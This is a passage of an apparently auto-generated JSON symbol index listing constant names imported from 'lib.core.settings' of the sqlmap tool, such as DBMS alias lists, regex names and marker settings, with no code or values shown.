    {
        "label": "HTTP_CHUNKED_SPLIT_KEYWORDS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_PARAMETERS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_SAVE_OPTIONS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_UNKNOWN_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IP_ADDRESS_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ISSUES_PAGE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_TTY",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LARGE_OUTPUT_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LOCALHOST",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_INT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_ENCODED_LEN_CHECK",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_ERROR_PARSING_NON_WRITING_RATIO",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_TIME_RESPONSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_VALID_DELAYED_RESPONSE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NETSCAPE_FORMAT_HEADER_COOKIES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARAMETER_AMP_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARAMETER_SEMICOLON_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARAMETER_PERCENTAGE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARTIAL_HEX_VALUE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARTIAL_VALUE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PAYLOAD_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PLATFORM",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRINTABLE_CHAR_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PROBLEMATIC_CUSTOM_INJECTION_PATTERNS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PUSH_VALUE_EXCEPTION_RETRY_COUNT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PYVERSION",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RANDOMIZATION_TLDS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFERER_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_BORDER_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_MAX_REGEX_PARTS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_REPLACEMENT_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_REPLACEMENT_TIMEOUT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_VALUE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTIVE_MISS_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SENSITIVE_DATA_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SENSITIVE_OPTIONS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "STDIN_PIPE_DASH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUPPORTED_DBMS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TEXT_TAG_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TIME_STDEV_COEFF",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNKNOWN_DBMS_VERSION",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URI_QUESTION_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URLENCODE_CHAR_LIMIT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URLENCODE_FAILSAFE_CHARS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "USER_AGENT_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_COMPARISON_CORRECTION",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_STRING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ZIP_HEADER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WEBSCARAB_SPLITTER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INVALID_UNICODE_PRIVATE_AREA",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_TTY",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PICKLE_PROTOCOL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SAFE_HEX_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CACHE_ITEMS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ACCESS_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ALTIBASE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BLANK",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CACHE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CRATEDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CUBRID_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DB2_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DERBY_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EXTREMEDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FIREBIRD_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FRONTBASE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "H2_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HSQLDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFORMIX_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAXDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MCKOI_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIMERSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MONETDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MSSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MYSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ORACLE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PGSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRESTO_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RAIMA_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQLITE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SYBASE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERTICA_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VIRTUOSO_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMP_FILE_BUFFER_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTML_DUMP_CSS_STYLE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_BINARY_DISK_DUMP_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TRIM_STDOUT_DUMP_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNSAFE_DUMP_FILEPATH_REPLACEMENT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_STRING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WINDOWS_RESERVED_NAMES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEV_EMAIL_ADDRESS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ISSUES_PAGE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GIT_PAGE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SITE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_STRING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WIKI_PAGE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CODECS_LIST_PAGE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CUSTOM_INJECTION_MARK_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DBMS_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_GET_POST_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_PAGE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_TOR_HTTP_PORTS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_TOR_SOCKS_PORTS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_USER_AGENT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_URL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_CODE_WILDCARD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "KB_CHARS_BOUNDARY_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "KB_CHARS_LOW_FREQUENCY_ALPHABET",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LOCALHOST",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECT_RETRIES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_NUMBER_OF_THREADS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARAMETER_SPLITTING_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRECONNECT_CANDIDATE_TIMEOUT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PROXY_ENVIRONMENT_VARIABLES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SOCKET_PRE_CONNECT_QUEUE_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQLMAP_ENVIRONMENT_PREFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUPPORTED_DBMS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUPPORTED_OS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TIME_DELAY_CANDIDATES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNION_CHAR_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNKNOWN_DBMS_VERSION",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URI_INJECTABLE_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PLATFORM",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUPPORTED_DBMS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_HISTORY_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ARRAY_LIKE_RECOGNITION_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ASTERISK_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CSRF_TOKEN_PARAMETER_INFIXES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CUSTOM_INJECTION_MARK_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_GET_POST_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HOST_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INJECT_HERE_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "JSON_LIKE_RECOGNITION_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "JSON_RECOGNITION_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MULTIPART_RECOGNITION_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PROBLEMATIC_CUSTOM_INJECTION_PATTERNS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFERER_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTORE_MERGED_OPTIONS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESULTS_FILE_FORMAT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SESSION_SQLITE_FILE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUPPORTED_DBMS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNENCODED_ORIGINAL_VALUE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNKNOWN_DBMS_VERSION",
